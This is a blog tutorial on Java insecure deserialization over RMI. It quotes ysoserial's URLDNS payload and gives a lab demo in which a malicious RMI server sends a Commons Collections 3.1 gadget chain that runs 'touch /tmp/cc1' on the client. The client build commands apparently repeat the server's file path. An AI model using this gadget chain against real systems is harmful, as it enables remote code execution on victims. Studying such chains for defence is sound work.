# :globe_with_meridians: JNDI Injection Series: RMI Vector - Insecure Deserialization

---

# JNDI Injection Series: RMI Vector - Insecure Deserialization

*Photo by [Olivier Miche](https://unsplash.com/@oliviermiche?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)*

## Insecure Deserialization in Java

Serialization refers to a process of converting an multi-dimensional object into a flattened format which can be persisted to disk or sent over a network. An object can be serialized to multiple formats, either binary or structured text.

Deserialization on the other hand, is the opposite of serialization, that is, transforming serialized data coming from a file, stream or network socket into an object. During the deserialization process, magic methods will be invoked automatically, and the readObject() method is one of them, and it can construct any sort of serializable object that can be found on the Java classpath before passing it back to the caller for the type_check.

But the deserialization can be repurposed maliciously when operating on untrusted data which the attackers control. The explanation of insecure deserialization starts with gadget.

Gadgets are certain java classes or functions which are available within in executing scope of an target application. A gadget library is a java library containing one or more gadgets.

A gadget chain is a malicious sequence of gadget calls created by an attacker to achieve certain goals like RCE.

The combinations of java gadgets allow crafting malicious “gadget chains”, with fields tweaked using java reflection or binary manipulation to control the execution flow and lead to compromise of victim application during the deserialization process.

The deep understanding of manually building Java gadgets is an advanced skill, luckily the absence of such knowledge doesn’t thwart exploitation on most java deserialization vulnerabilities. Just keep in mind that to exploit the deserialization flaws, there are two conditions to meet, the first is the code uses the readObject to deserialized objects from the untrusted source, the second is that the gadget libraries are accessible in executing scope of an target application.

One simple sample object for insecure deserialization is URLDNS payload in [https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java) for DNS exfiltration.

```
public Object getObject(final String url) throws Exception {
​
//Avoid DNS resolution during payload creation
//Since the field java.net.URL.handler is transient, it will not be part of the serialized payload.
URLStreamHandler handler = new SilentURLStreamHandler();
​
HashMap ht = new HashMap(); // HashMap that will contain the URL
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
​
Reflections.setFieldValue(u, "hashCode", -1);
// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
​
return ht;
}
```

The malicious ht is deliberately crafted by inserting an URL object as the key, and set the URL object ‘s hashCode to -1.

The gadget chain is illustrated as below:

The most well-known tool to exploit Java deserializations is [ysoserial](https://github.com/frohoff/ysoserial), it uses a collection of gadget chains discovered in common Java libraries to formulate exploit objects. The next demo uses one payload on top of Apache Commons Collections commons-collections-3.1.jar to showcase insecure deserialization attack in RMI context.

## Attack Java RMI Services with Insecure Deserialization

In the previous blog post JNDI Injection Series: RMI Vector — Dynamic Class Loading From Remote URL, attack scenario utilizing dynamic class loading from remote URL is rare in reality although it is feasible theoretically. As mentioned in the previous blog post JNDI Injection Series: RMI Vector — Dynamic Class Loading From Remote URL, Java RMI (Remote Method Invocation) is based on native Java deserialization. RMI services are the major victims of Java deserialization apocalypse.

## Demo Attacking the RMI Client

In this demo, there are two servers, one is the RMI client with IP 192.168.0.96, the other one is the RMI server with IP 192.168.0.95. There is commons-collections-3.1.jar in both RMI servers, the deserialization payload relies on classes in apache.commons.collections library. This demo is using the same Java environment set up in the 2.1 section of this blog for both the RMI server and the RMI client.

The following diagram depicts the attacking process in a simplified way:

Set up an RMI Server

## Get Yani’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

There is nothing special in the RMI server definition class.

```
public class Server {
public static void main(String[] args) throws Exception{
String url = "rmi://127.0.0.1:1099/user";
User user = new LocalUser("bob",15);
LocateRegistry.createRegistry(1099);
Naming.bind(url,user);
System.out.println("the rmi is running ...");
}
}
```

The server binds LocalUser object to “rmi://127.0.0.1:1099/user” end point.

Let us take a look at LocalUser class. The getUser method returns a handler object which is a malicious object to trigger the RCE and execute “touch /tmp/cc1” command defined in the last InvokerTransformer object item inside the transformer chain.

```
public class LocalUser extends UnicastRemoteObject implements User {
public String name;
public int age;
​
public LocalUser(String name, int age) throws RemoteException {
super();
this.name = name;
this.age = age;
}
​
public Object getUser(){
​
InvocationHandler handler = null;
try {
ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod", new Class[]{
String.class, Class[].class}, new Object[]{
"getRuntime", new Class[0]}),
new InvokerTransformer("invoke", new Class[]{
Object.class, Object[].class}, new Object[]{
null, new Object[0]}),
new InvokerTransformer("exec",
new Class[]{String.class}, new Object[]{"touch /tmp/cc1"})});
HashMap innermap = new HashMap();
Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
Constructor[] constructors = clazz.getDeclaredConstructors();
Constructor constructor = constructors[0];
constructor.setAccessible(true);
Map map = (Map) constructor.newInstance(innermap, chain);
​
Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
handler_constructor.setAccessible(true);
InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map);
​
Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler);
​
Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
AnnotationInvocationHandler_Constructor.setAccessible(true);
handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);
​
}catch(Exception e){
e.printStackTrace();
}
​
return (Object)handler;
}
}
```

To build the RMI server code, commons-collections-3.1.jar is placed under the class path specified in the command line.

The files are structured as below:

Compile the RMI server and launch it

```
[root@demo rmi-server]# javac -cp lib/*:. rmi/server/RmiServer.java
[root@demo rmi-server]# java -cp lib/*:. rmi/server/RmiServer
the rmi is running ...
```

Set up an Client Client

The RMI client is codified in Client.java

```
public class Client {
​
public static void main(String[] args) throws Exception {
String host = "localhost";
if (args.length > 0)
host = args[0];
​
Registry registry = LocateRegistry.getRegistry(host,1099);
User user = (User) registry.lookup("user");
user.getUser();
}
}
```

When the user’s getUser method gets invoked, it kicks off the gadget chain designed by the handler object.

The folder structure for the RMI client:

Compile the RMI client and launch it

```
[root@demo rmi-client]# javac -cp lib/*:. rmi/server/RmiServer.java
[root@demo rmi-client]# java -cp lib/*:. rmi/server/RmiServer
```

Go to the tmp folder to check the result of the remote command execution, it is found that a file named cc1 is generated, which means “touch /tmp/cc1” command in the crafted serialized object by the RMI server is executed successfully on the RMI client server.

```
[root@demo ~]# ls /tmp/
cc1
```

The source code for this demo is available from the [github](https://github.com/zer0-map/JNDI-Injection-Series/tree/main/RMIVector/rmi-InsecureDeserialization-attackClient) , you can choose to download commons-collections-3.1.jar from the [maven website](https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar) instead of using the one in the git repo.

This time, I believe you are able to set up an attack scenario with the RMI server as the victim on your own using the knowledge you learnt so far if you follow up this series. Next time we will move on to the topic of theJNDI injection with RMI vector.

Before wrap this blog post up, it is worth mentioning that to address the risk of insecure deserialization, several changes have been made in the Java core by adding multiple defense mechanisms like serialization filters. The old gadget chains now are not workable in the newer Java libraries. But hackers are creative and can always find more gadgets in other libraries, and come up with creative ways to achieve the same results.

## Final Thoughts

If you have any questions or feedback, feel free to leave a comment. If you think this blog post is helpful, please click the clap 👏 button below a few times to show your support!

Reference:

[https://xz.aliyun.com/t/9053](https://xz.aliyun.com/t/9053) (in Chinese)

---
